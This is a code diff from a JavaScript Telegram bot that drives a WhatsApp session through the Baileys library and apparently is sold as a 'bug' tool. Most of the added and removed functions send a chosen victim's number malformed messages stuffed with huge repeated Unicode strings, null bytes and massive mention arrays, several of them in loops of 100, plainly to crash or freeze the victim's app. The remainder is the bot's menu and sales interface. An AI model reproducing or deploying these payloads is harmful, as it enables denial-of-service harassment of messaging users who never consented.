+          paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RanstechZvX@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"ok\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+          version: 3
+        },
+        contextInfo: {
+         forwardingScore: 9999,
+         isForwarded: true,
+         entryPointConversionSource: "payment_method"
+        }
+      }
+    }
+   }
+  }, { participant: { jid: target }});
+}
+
+async function Delayft(sock, target) {
+    for (let i = 0; i < 100; i++) {    
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        body: {
+                            text: "\x10"
+                        },
+                        nativeFlowMessage: {
+                            buttons: "[".repeat(500000)
+                        }
+                    }
+                }
+            }
+        }, {
+            participant: {
+                jid: target
+            }
+        });
+
+        await sleep(1000);
+    }
+}
+
+async function DelayButtonsV2(sock, target) {
+    for (let i = 0; i < 100; i++) {    
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        body: {
+                            text: "\0"
+                        },
+                        nativeFlowMessage: {
+                            buttons: "[".repeat(500000)
+                        }
+                    }
+                }
+            }
+        }, {
+            participant: {
+                jid: target
+            }
+        });
+
+        await sleep(1000);
+    }
+}
+
+async function BlankWithProto(sock, target) {
+    try {
+        const message = {
+            interactiveMessage: {
+                header: {
+                    title: "ꦾ".repeat(50000),
+                    hasMediaAttachment: false
+                },
+                body: {
+                    text: "ꦽ".repeat(60000)
+                },
+                footer: {
+                    text: "@1".repeat(40000)
+                },
+                nativeFlowMessage: {
+                    buttons: [
+                        {
+                            name: "booking_confirmation",
+                            buttonParamsJson: "ꦾ".repeat(100000)
+                        }
+                    ]
+                }
+            }
+        };
+        
+        const protoMessage = proto.Message.fromObject(message);
+        
+        await sock.relayMessage(target, protoMessage, {
+            messageId: null,
+            participant: { jid: target }
+        });
+    } catch (err) {
+        console.log("Error:", err);
+    }
+}
+
+async function ForceXDelayX7(sock, target) {
+    for (let i = 0; i < 100; i++) {
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        body: {
+                            text: "\x10"
+                        },
+                        contextInfo: {},
+                        nativeFlowMessage: {
+                            // Dibungkus ke dalam array objek agar valid secara sintaksis di Baileys
+                            buttons: [
+                                {
+                                    name: "quick_reply",
+                                    buttonParamsJson: JSON.stringify({
+                                        display_text: "[".repeat(500000),
+                                        id: "force_x_id"
+                                    })
+                                }
+                            ]
+                        }
+                    }
+                }
+            }
+        }, {
+            participant: {
+                jid: target
+            }
+        });
+
+        await sleep(1000);
+    }
+}
+
+
+async function invui(sock, target) {
+  try {
+    let msg = generateWAMessageFromContent(
+      target,
+      {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              header: {
+                title: "X" + "ꦽ".repeat(20000),
+                hasMediaAttachment: false
+              },
+              body: {
+                text: "X" + "ꦽ".repeat(20000)
+              },
+              footer: {
+                text: "X" + "ꦾ".repeat(20000)
+              },
+              nativeFlowMessage: {
+                messageParamsJson: "\n".repeat(10000),
+                buttons: [
+                  {
+                    name: "single_select",
+                    buttonsParamsJson: `{"title":"${"ꦾ".repeat(5000)}","sections":[{"title":"${"ꦾ".repeat(5000)}","rows":[{"id":"BS736-DJBDJZ","title":"${"ꦾ".repeat(5000)}","description":"${"ꦾ".repeat(5000)}"}]}]}`
+                  },
+                  {
+                    name: "cta_url",
+                    buttonsParamsJson: `{"display_text":"X","url":"https://t.me/${"ꦾ".repeat(10000)}"}`
+                  }
+                ]
+              },
+              contextInfo: {
+                stanzaId: sock.generateMessageTag(),
+                participant: target,
+                remoteJid: "status@broadcast",
+                mentionedJid: [target],
+                expiration: 1,
+                ephemeralSettingTimestamp: 1,
+                entryPointConversionSource: "WhatsApp.com",
+                entryPointConversionApp: "WhatsApp",
+                entryPointConversionDelaySeconds: 1,
+                disappearingMode: {
+                  initiatorDeviceJid: target,
+                  initiator: "INITIATED_BY_OTHER",
+                  trigger: "UNKNOWN_GROUPS"
+                },
+                externalAdReply: {
+                  title: "X" + "ꦾ".repeat(10000),
+                  mediaType: 1,
+                  renderLargerThumbnail: true,
+                  thumbnailUrl: "https://h.top4top.io/p_37414jxf01.jpg",
+                  sourceUrl: "https://Wa.me/stickerpack/settings"
+                },
+                quotedMessage: {
+                  paymentInviteMessage: {
+                    serviceType: 1,
+                    expiryTimestamp: null
+                  }
+                }
+              }
+            }
+          }
+        }
+      },
+      {}
+    );
+    
+    await sock.relayMessage(target, msg.message, {
+      messageId: msg.key.id,
+      participant: { jid: target }
+    });
+  } catch (err) {
+    console.error(err);
+  }
+}
+
+async function X7Force(sock, target, mention) {
+  try {
+    const X7 = {
+      imageMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7118-24/707062092_990233686791803_5791187249860495_n.enc?ccb=11-4&oh=01_Q5Aa4gG3A0lB9m8hbkqmzzr9NICafjhqWAiAf87fzzz6P70M3Q&oe=6A3A5C67&_nc_sid=5e03e0&mms3=true",
+        mimetype: "image/jpeg",
+        fileSha256: "lFGMyvJ/fa0ENT/qSsI36qKlD4nAOVmm7l+JLA27bjc=",
+        fileLength: "27863",
+        height: 512,
+        width: 512,
+        mediaKey: "6FAAS0F/TCH5hTx2D94qP9/TUSvAJ3IhxowGvN2Se5E=",
+        fileEncSha256: "kQiasMsk2L3nSlfq0B+a0ruPFR+USHYL2CmlVNk7Cb0=",
+        directPath: "/v/t62.7118-24/707062092_990233686791803_5791187249860495_n.enc?ccb=11-4&oh=01_Q5Aa4gG3A0lB9m8hbkqmzzr9NICafjhqWAiAf87fzzz6P70M3Q&oe=6A3A5C67&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1779622697",
+        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAADBAUBAgYAAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAcaRc5bc9xdcWuPPmK+gMvrgIz5yVlhJ2+XAwq62+0GyG852FILPwKLqZxsNrRqWFPO+JOgCqt0Tmjs6dDO7xJv/EACMQAAICAgEDBQEAAAAAAAAAAAECAAMRIRIEMUEQEyJCYRT/2gAIAQEAAT8AoHHKwReqqLFc4MPUUju8F9R+4j9XUmgeRlLM65b0p51j5DM5gKWl9gL8ipAM4AgGOwDYBMrsVXXkIrjAxGsxOMdDxbECE6Meq0HgDAGX4iP3w0rb4LvxAcn0Y4UmByWJjMBsrGc+BGJOTKLR7QGdxNL6PtGH5CzVOfKwWKyyxlAMJZzrtKzxaI4KgCZmZfRlzxOIyWL9YyORpRChA2ZWcHcomIWC95eSHLAHE/oXBBBMPUodKphy5J4nUKygup/IY5CFGPgx+opYpsaM6dQvvO/HZgs6bguOGOUaynZBWXItjIQR22BAgXtP/8QAHBEAAgIDAQEAAAAAAAAAAAAAAAECERATIRJR/9oACAECAQE/ALLLYpcxYnnjFSxFW0jXH6a4k35dH//EABkRAAIDAQAAAAAAAAAAAAAAAAABEBEhEv/aAAgBAwEBPwCooqXOocN4ds6YtR//2Q==",
+        contextInfo: {
+          pairedMediaType: "NOT_PAIRED_MEDIA",
+          statusSourceType: "IMAGE"
+        },
+        scansSidecar: "KRy090WpoLj4UrkdQAdd5hMq0geWreUcCKao1K2PxqR3yUY3tER12A==",
+        scanLengths: [3373, 11018, 5500, 7972],
+        midQualityFileSha256: "eGJTiN9f5gnEK+alcMZQkNwmVaXJ41E6hKo4mOebumc="
+      }
+    };
+    await sock.relayMessage(target, X7, mention ? { participant: { jid: target } } : {});
+    return { status: true, message: "Success sent to " + target };
+  } catch (err) {
+    return { status: false, message: err.message };
+  }
+}
+
+async function iosTrav(sock, target) {
   try {
-    const msg = await generateWAMessageFromContent(
+    let msg = generateWAMessageFromContent(
       target,
       {
         viewOnceMessage: {
           message: {
-            stickerPackMessage: {
-              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
-              name: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
-              publisher: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
-              caption: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
-
-              stickers: [
-                ...Array.from({ length: 4700 }, () => ({
-                  fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
-                  isAnimated: false,
-                  emojis: ["🦠", "🩸", "☠️", "💥"],
-                  accessibilityLabel: "",
-                  stickerSentTs: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-                  isAvatar: true,
-                  isAiSticker: true,
-                  isLottie: true,
-                  mimetype: "application/pdf"
-                }))
-              ],
-
-              fileLength: "1073741824000",
-              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
-              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
-              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
-              directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
-
+            extendedTextMessage: {
+              text: "#xylent" + "𑇂𑆵𑆴𑆿".repeat(15000),
+              matchedText: "#NullStrick" + "𑇂𑆵𑆴𑆿".repeat(10000),
+              canonicalUrl: "http://Wa.me/stickerpack/settings",
+              title: "#xylent",
+              description: "𑇂𑆵𑆴𑆿".repeat(10000),
+              jpegThumbnail: null,
               contextInfo: {
-                remoteJid: "0@s.whatsapp.net",
                 participant: target,
-                stanzaId: "1234567890ABCDEF",
-                mentionedJid: [
-                  "0@s.whatsapp.net",
-                  ...Array.from({ length: 1990 }, () =>
-                    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-                  )
-                ],
-                quotedMessage: {
-                  locationMessage: {
-                    degreesLongitude: 9999,
-                    degreesLatitude: 9999,
-                    name: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
-                    url: "https://Wa.me/stickerpack" + "ꦽ".repeat(10000),
-                    address: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄"
-                  }
+                remoteJid: target,
+                mentionedJid: ["13135550001@s.whatsapp.net"],
+                externalAdReply: {
+                  title: "#xylent",
+                  mediaType: 1,
+                  renderLargerThumbnail: true,
+                  thumbnailUrl: "https://h.top4top.io/p_37414jxf01.jpg",
+                  sourceUrl: "https://Wa.me/stickerpack/settings"
                 }
-              },
-
-              mediaKeyTimestamp: "1747502082",
-              trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
-              thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
-              thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
-              thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
-              thumbnailHeight: 252,
-              thumbnailWidth: 252,
-              imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
-              stickerPackSize: "999999999",
-              stickerPackOrigin: "USER_CREATED"
+              }
             }
           }
         }
       },
-      { userJid: target }
+      {}
     );
     
     await sock.relayMessage(target, msg.message, {
@@ -1886,4828 +5361,235 @@ async function stickerUi(sock, target) {
   }
 }
 
-async function NvXStuckLogo(sock, target) {
-  try {
-    const NvXAsep = {
-      viewOnceMessage: {
-        message: {
-          newsletterAdminInviteMessage: {
-             newsletterJid: "123456789@newsletter",
-             inviteCode: "𑜦𑜠".repeat(120000),
-             inviteExpiration: 99999999999,
-             newsletterName: "ោ៝" + "ꦾ".repeat(250000),
-             body: {
-                 text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" + "ી".repeat(250000)
-                }
-             }
-          }
-       }
-    };
-
-    await sock.relayMessage(target, NvXAsep, { participant: { jid: target } });
-  } catch (e) {
-    console.log("❌ Error Bng:", e.message || e);
-  }
-}
-
-async function X7Blank(target) {
-  const ButtonsX = [];
-
-  for (let i = 0; i < 25; i++) {
-    ButtonsX.push({
-      buttonId: "cta_copy",
-      buttonText: {
-        displayText: "ꦽ".repeat(5000),
-      },
-      type: 4,
-      nativeFlowInfo: {
-        name: "single_select",
-        paramsJson: JSON.stringify({
-          title: "ꦽ".repeat(5000),
-          sections: [
-            {
-              title: "Pinzy𝖷𝟩",
-              highlight_label: "label",
-              rows: [],
-            },
-          ],
-        }),
-      },
-    });
-  }
-
-  await sock.sendMessage(
-    target,
-    {
-      text: "ꦽ".repeat(25000),
-      footer: "Pinzy𝖷𝟩" + "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
-      viewOnce: true,
-      buttons: ButtonsX,
-      headerType: 1,
-      contextInfo: {
-        participant: target,
-        mentionedJid: [
-          "131338822@s.whatsapp.net",
-          ...Array.from(
-            { length: 40000 },
-            () =>
-              "1" +
-              Math.floor(Math.random() * 5000000) +
-              "@s.whatsapp.net"
-          ),
-        ],
-        remoteJid: "X",
-        forwardingScore: 100,
-        isForwarded: true,
-        stanzaId: "1234567890ABCDEF",
-        quotedMessage: {
-          paymentInviteMessage: {
-            serviceType: 3,
-            expiryTimestamp: Date.now() + 1814400000,
-          },
-        },
-        businessMessageForwardInfo: {
-          businessOwnerJid: target,
-        },
-      },
-    },
-    {
-      ephemeralExpiration: 5,
-      timeStamp: Date.now(),
-      participant: { jid: target },
-    }
-  );
-}
-
-
-const mediaData = [
-  {
-    ID: "68917910",
-    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
-    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
-    sid: "5e03e0",
-    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
-    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
-  },
-  {
-    ID: "68884987",
-    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
-    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
-    sid: "5e03e0",
-    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
-    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
-  },
-];
-
-let sequentialIndex = 0;
-
-async function X7Bulldozer(sock, target) {
-  try {
-   const selectedMedia = mediaData[sequentialIndex];
-
-  sequentialIndex = (sequentialIndex + 1) % mediaData.length;
-
-  const MD_ID = selectedMedia.ID;
-  const MD_Uri = selectedMedia.uri;
-  const MD_Buffer = selectedMedia.buffer;
-  const MD_SID = selectedMedia.sid;
-  const MD_sha256 = selectedMedia.SHA256;
-  const MD_encsha25 = selectedMedia.ENCSHA256;
-  const mkey = selectedMedia.mkey;
-
-  let parse = true;
-  let type = `image/webp`;
-  if (11 > 9) {
-    parse = parse ? false : true;
-  }
-
-  let message = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
-          fileSha256: MD_sha256,
-          fileEncSha256: MD_encsha25,
-          mediaKey: mkey,
-          mimetype: type,
-          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
-          fileLength: {
-            low: Math.floor(Math.random() * 1000),
-            high: 0,
-            unsigned: true,
-          },
-          mediaKeyTimestamp: {
-            low: Math.floor(Math.random() * 1700000000),
-            high: 0,
-            unsigned: false,
-          },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo: {
-            participant: target,
-            urlTrackingMap: {
-               urlTrackingMapElements: Array.from(
-                 { length: 500000 },
-                 () => ({ "\0": "\0" })
-               )
-            }, 
-            groupMentions: [],
-            entryPointConversionSource: "non_contact",
-            entryPointConversionApp: "whatsapp",
-            entryPointConversionDelaySeconds: 467593,
-          },
-          stickerSentTs: {
-            low: Math.floor(Math.random() * -20000000),
-            high: 555,
-            unsigned: parse,
-          },
-          isAvatar: parse,
-          isAiSticker: parse,
-          isLottie: parse,
-        },
-      },
-    },
-  };
-  
-  let message1 = {
-    interactiveResponseMessage: {
-      body: {
-        text: "𝖡𝗒: pinzyX7", 
-        format: "DEFAULT"
-      }, 
-      nativeFlowResponseMessage: {
-        name: "call_permission_request", 
-        paramsJson: "\u0000".repeat(1045000), 
-        version: 3
-      }, 
-      contextInfo: {
-        remoteJid: "status@broadcast", 
-        isGroupStatus: true, 
-        urlTrackingMap: {
-         urlTrackingMapElements: Array.from(
-            { length: 500000 },
-            () => ({ "\0": "\0" })
-          )
-        }
-      }
-    }
-  };
-
-  const msg = generateWAMessageFromContent(target, message, {});
-  const msg1 = generateWAMessageFromContent(target, message1, {});
-  await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id, statusJidList: [target], additionalNodes: [{
-        tag: "meta", attrs: {}, content: [{
-          tag: "mentioned_users", attrs: {}, content: [{
-            tag: "to", attrs: { jid: target }, content: undefined
-          }]
-        }]
-      }]
-    });
-   await sock.relayMessage(target, {
-     groupStatusMessageV2: {
-       message: msg1.message
-     }
-   }, {
-    messageId: msg.key.id, 
-    participant: { jid: target }
-   });
-  } catch (err) {
-    console.log(err);
-  }
-}
-//------------------------------------------------------------------------------------------------------------------------------\\
-//------------------------------------------------------------------------------------------------------------------------------\\
-
-// NGAPAIN DI MT MANAGER BG 🤔
-
-function isOwner(userId) {
-  return config.OWNER_ID.includes(userId.toString());
-}
-const bugRequests = {};
-const userButtonColor = {};
-// 1. Fungsi untuk mengambil style secara acak
-// Map untuk menampung interval agar bisa dihentikan saat pesan dihapus
-const buttonIntervals = new Map();
-const userState = new Map();
-
-// Handler Menu Utama supaya bisa dipanggil di /start dan back_to_main
-async function sendStartMenu(chatId, from) {
-
-  const userId = from.id
-  const randomImage = getRandomImage()
-
-  const runtimeStatus = formatRuntime()
-  const memoryStatus = formatMemory()
-
-  const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
-  const botNumber = sessions.size
-
-  const chosenColor = userButtonColor[userId] || "primary"
-  const safeColor = userButtonColor[userId] || "primary"
-
-  let styles
-
-  if (chosenColor === "disco") {
-     styles = ["primary", "danger", "success"]
-  }
-
-  else {
-
-    const safeColor = {
-      danger: "danger",
-      success: "success",
-      secondary: "primary" 
-    }
-
-    styles = [ safeColor[chosenColor] || "primary" ]
-  }
-
-  let index = 0
-
-  let keyboard = [
-    [
-      {
-        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
-        callback_data: "trashmenu",
-        style: styles[index],
-        icon_custom_emoji_id: "6219549292458150316"
-      },
-      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
-    ],
-    [
-      { text: "TOOLS", callback_data: "tols", style: styles[index] },
-            {
-  text: "Developer",
-  url: "https://t.me/Pinnxzy",
-  style: styles[index],
-  icon_custom_emoji_id: "5260535596941582167"
-}
-    ]
-    [
-            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
-            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
-            
-    ],
-    [
-            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
-            
-          ]
-  ]
-
-  if (chosenColor === "disco") {
-
-    keyboard = [
-      [
-        {
-        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
-        callback_data: "trashmenu",
-        style: styles[index],
-        icon_custom_emoji_id: "6219549292458150316"
-      },
-      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
-    ],
-    [
-      { text: "TOOLS", callback_data: "tols", style: styles[index] },
-            {
-  text: "Developer",
-  url: "https://t.me/Pinnxzy",
-  style: styles[index],
-  icon_custom_emoji_id: "5260535596941582167"
-}
-      ],
-      [
-            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
-            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
-            
-          ],
-          [
-            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
-            
-          ]
-    ]
-
-  }
-  
-  if (safeColor === "danger") {
-
-    keyboard = [
-      [
-        {
-        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
-        callback_data: "trashmenu",
-        style: styles[index],
-        icon_custom_emoji_id: "6219549292458150316"
-      },
-      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
-    ],
-    [
-      { text: "TOOLS", callback_data: "tols", style: styles[index] },
-            {
-  text: "Developer",
-  url: "https://t.me/Pinnxzy",
-  style: styles[index],
-  icon_custom_emoji_id: "5260535596941582167"
-}
-      ],
-      [
-            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
-            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
-            
-          ],
-          [
-            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
-            
-          ]
-    ]
-
-  }
-  
-  if (safeColor === "success") {
-
-    keyboard = [
-      [
-        {
-        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
-        callback_data: "trashmenu",
-        style: styles[index],
-        icon_custom_emoji_id: "6219549292458150316"
-      },
-      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
-    ],
-    [
-      { text: "TOOLS", callback_data: "tols", style: styles[index] },
-            {
-  text: "Developer",
-  url: "https://t.me/Pinnxzy",
-  style: styles[index],
-  icon_custom_emoji_id: "5260535596941582167"
-}
-      ],
-      [
-            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
-            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
-            
-          ],
-          [
-            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
-            
-          ]
-    ]
-
-  }
-  
-  if (safeColor === "primary") {
-
-    keyboard = [
-      [
-        {
-        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
-        callback_data: "trashmenu",
-        style: styles[index],
-        icon_custom_emoji_id: "6219549292458150316"
-      },
-      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
-    ],
-    [
-      { text: "TOOLS", callback_data: "tols", style: styles[index] },
-            {
-  text: "Developer",
-  url: "https://t.me/Pinnxzy",
-  style: styles[index],
-  icon_custom_emoji_id: "5260535596941582167"
-}
-      ],
-      [
-            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
-            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
-            
-          ],
-          [
-            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
-            
-          ]
-    ]
-
-  }
-
-  const sent = await bot.sendPhoto(chatId, randomImage, {
-
-    caption: `
-<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ Type Script: Bebas spam bugs & No Spam
-
-<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
-⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : ${status}
-⎔ 𝗡𝘂𝗺𝗯𝗲𝗿 : ${botNumber}
-⎔ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲: ${runtimeStatus}
-⎔ 𝗠𝗲𝗺𝗼𝗿𝘆: ${memoryStatus}
-`,
-
-    parse_mode: "HTML",
-
-    reply_markup: {
-      inline_keyboard: keyboard
-    }
-
-  })
-
-  const messageId = sent.message_id
-
-  if (styles.length > 1) {
-
-    const intervalId = setInterval(async () => {
-
-      index++
-      if (index >= styles.length) index = 0
-
-      let newKeyboard
-
-      if (chosenColor === "disco") {
-
-        newKeyboard = [
-          [
-            {
-        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
-        callback_data: "trashmenu",
-        style: styles[index],
-        icon_custom_emoji_id: "6219549292458150316"
-      },
-      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
-    ],
-    [
-      { text: "TOOLS", callback_data: "tols", style: styles[index] },
-      {
-  text: "Developer",
-  url: "https://t.me/Pinnxzy",
-  style: styles[index],
-  icon_custom_emoji_id: "5260535596941582167"
-}
-          ],
-          [
-            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
-            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
-            
-          ],
-          [
-            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
-            
-          ]
-        ]
-
-      } else {
-
-        newKeyboard = [
-          [
-            {
-              text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
-              callback_data: "trashmenu",
-              style: styles[index],
-              icon_custom_emoji_id: "6219549292458150316"
-            },
-            { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
-          ],
-          [
-            { text: "TOOLS", callback_data: "tols", style: styles[index] },
-            {
-  text: "Developer",
-  url: "https://t.me/Pinnxzy",
-  style: styles[index],
-  icon_custom_emoji_id: "5260535596941582167"
-}
-          ],
-          [
-            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
-            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
-            
-          ],
-          [
-            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
-            
-          ]
-        ]
-
-      }
-
-      try {
-
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: newKeyboard },
-          {
-            chat_id: chatId,
-            message_id: messageId
-          }
-        )
-
-      } catch (e) {}
-
-    }, 2000)
-
-    buttonIntervals.set(messageId, intervalId)
-
-  }
-
-}
-
-
-// Handler Utama
-bot.onText(/\/start/, async (msg) => {
-
-const chatId = msg.chat.id
-const from = msg.from
-const userId = from.id
-const firstName = msg.from.first_name || "User"
-const randomImage = getRandomImage();
-
-try {
-
-await bot.sendPhoto(
-  chatId,
-  randomImage,
-  {
-    caption: `
-<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━
-( 👁️ ) Holla ${firstName}
-Selamat datang di 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6165775219580472827">☠</tg-emoji> 1Gen3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji> Owner @Pinnxzy
-Gunakan bot ini dengan bijak, tekan tombol di bawah untuk membuka menu utama.
-
- 👑 𝗣𝗲𝗻𝗱𝗶𝗿𝗶 : @Pinnxzy<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
- 🏆 𝗢𝘄𝗻𝗲𝗿 : @kanotdevx<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
- 🏆 𝗢𝘄𝗻𝗲𝗿 : @SBErsstore1<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
- 🏆 𝗠𝘆 𝗙𝗿𝗶𝗲𝗻𝗱 : @NexiRajaIblis<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-</b></blockquote>
-
-<blockquote>☰ NOTE: The Button Mode</blockquote>
-`,
-    parse_mode:"HTML",
-    reply_markup:{
-      inline_keyboard:[
-        [
-          { text:"🔴 Merah", callback_data:"color_danger" },
-          { text:"🟢 Hijau", callback_data:"color_success" }
-        ],
-        [
-          { text:"🔵 Biru", callback_data:"color_primary" }, 
-          { text:"🪩 Disko", callback_data:"color_disco" }
-        ]
-      ]
-    }
-  }
-)
-
-} catch(err) {
-console.log("START ERROR:", err)
-}
-
-})
-
-bot.on("callback_query", async (query) => {
-
-  if (!query.message) return
-
-  const chatId = query.message.chat.id
-  const userId = query.from.id
-  const messageId = query.message.message_id
-  const data = query.data
-
-
-  if (buttonIntervals.has(messageId)) {
-
